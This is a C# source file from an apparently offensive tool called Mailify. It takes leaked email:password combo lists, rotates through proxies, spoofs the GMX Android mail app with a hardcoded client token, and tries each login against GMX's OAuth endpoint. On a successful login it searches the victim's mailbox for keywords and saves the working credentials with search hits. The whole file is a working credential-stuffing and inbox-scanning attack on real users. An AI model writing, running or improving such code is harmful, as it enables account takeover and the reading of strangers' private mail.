using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Mailify
{
    internal class Gmx_Germany_Scan
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;

            new Thread(() => Variables.Inbox_title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();

            Thread.Sleep(-1);
        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var req = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    req.Proxy.ConnectTimeout = proxyTimeout;
                    req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));


                    req.AddHeader("Authorization", "Basic Z214ZGFjaF9tYWlsYXBwX2FuZHJvaWQ6MUNLQzRYd3RyNXp3VVNHUGpkNUMyUnplNVBBeUJwR241eTBvVHhFaw==");
                    req.AddHeader("User-Agent", "gmx.android.androidmail/6.20.3 Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI RIO-L01 Build/HuaweiRIO-L01)");
                    req.AddHeader("X-UI-APP", "gmx.android.androidmail/6.20.3");
                    req.AddHeader("Connection", "Keep-Alive");
                    req.AddHeader("Accept-Encoding", "gzip");

                    var res0 = req.Post("https://oauth2.gmx.net/token", "grant_type=password&username=" + credentials[0] + "&password=" + credentials[1] + "&device_name=HUAWEI+HUAWEI+RIO-L01", "application/x-www-form-urlencoded");
                    string text1 = res0.ToString();

                    if (text1.Contains("access_token"))
                    {
                        var rt = Functions.JSON(text1, "refresh_token").FirstOrDefault();
                        req.AddHeader("Authorization", "Basic Z214ZGFjaF9tYWlsYXBwX2FuZHJvaWQ6MUNLQzRYd3RyNXp3VVNHUGpkNUMyUnplNVBBeUJwR241eTBvVHhFaw==");
                        req.AddHeader("User-Agent", "gmx.android.androidmail/6.20.3 Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI RIO-L01 Build/HuaweiRIO-L01)");
                        req.AddHeader("X-UI-APP", "gmx.android.androidmail/6.20.3");
                        req.AddHeader("Connection", "Keep-Alive");
                        req.AddHeader("Accept-Encoding", "gzip");

                        var res1 = req.Post("https://oauth2.gmx.net/token", "grant_type=refresh_token&refresh_token=" + rt + "&scope=mailbox_user_full_access+mailbox_user_status_access+foo+bar", "application/x-www-form-urlencoded");
                        string text2 = res1.ToString();

                        var at = Functions.JSON(text2, "access_token").FirstOrDefault();
                        try
                        {
                            foreach (string keyword in File.ReadAllLines("Files//Keywords.txt"))
                            {
                                req.AddHeader("Accept", "application/vnd.ui.trinity.messages+json");
                                req.AddHeader("Accept-Charset", "utf-8");
                                req.AddHeader("Authorization", "Bearer " + at + "");
                                req.AddHeader("User-Agent", "gmx.android.androidmail/6.20.3 Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI RIO-L01 Build/HuaweiRIO-L01)");
                                req.AddHeader("X-UI-APP", "gmx.android.androidmail/6.20.3");
                                req.AddHeader("Connection", "Keep-Alive");
                                req.AddHeader("Accept-Encoding", "gzip");

                                var res2 = req.Post("https://hsp.gmx.net/http-service-proxy1/service/msgsrv-gmx-mobile/Mailbox/primaryMailbox/Mail/Query?absoluteURI=false", "{\"condition\":[\"mail.header:from,replyTo,cc,bcc,to,subject:" + keyword + "\"],\"amount\":100,\"orderBy\":\"INTERNALDATE desc\",\"excludeFolderTypeOrId\":[\"OUTBOX\"],\"isTagsShowAll\":false,\"preferAbsoluteURIs\":false}", "application/json; charset=UTF-8");
                                string text3 = res2.ToString();

                                var totalCount = Functions.JSON(text3, "totalCount").FirstOrDefault();

                                if (totalCount == null || totalCount == "0")
                                {
                                    Variables.Custom++;
                                    Variables.Checked++;
                                    Variables.cps++;
                                    lock (Variables.WriteLock)
                                    {
                                        Variables.remove(combo);
                                        File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
                                    }
                                }
                                else
                                {
                                    Variables.Valid++;
                                    Variables.Checked++;
                                    Variables.cps++;
                                    lock (Variables.WriteLock)
                                    {
                                        Variables.remove(combo);
                                        if (Config.kekr_UI == "LOG")
                                        {
                                            Console.WriteLine($"[+] " + combo + " | Keyword: " + keyword + " | Results: " + totalCount, Color.Green);
                                        }
                                        File.AppendAllText(Variables.results + $"{keyword}.txt", combo + " | Keyword: " + keyword + " | Results: " + totalCount + Environment.NewLine);
                                    }
                                }
                            }
                        }
                        catch
                        {
                            Variables.Custom++;
                            Variables.Checked++;
                            Variables.cps++;
                            lock (Variables.WriteLock)
                            {
                                Variables.remove(combo);
                                File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
                            }
                        }
                      
                    }
                    else if (text1.Contains("OR_PASSWORD_WRONG") || text1.Contains("ACCOUNT_NOT_FOUND") || text1.Contains("invalid_grant"))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                        }
                    }
                    else
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }

                }
            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}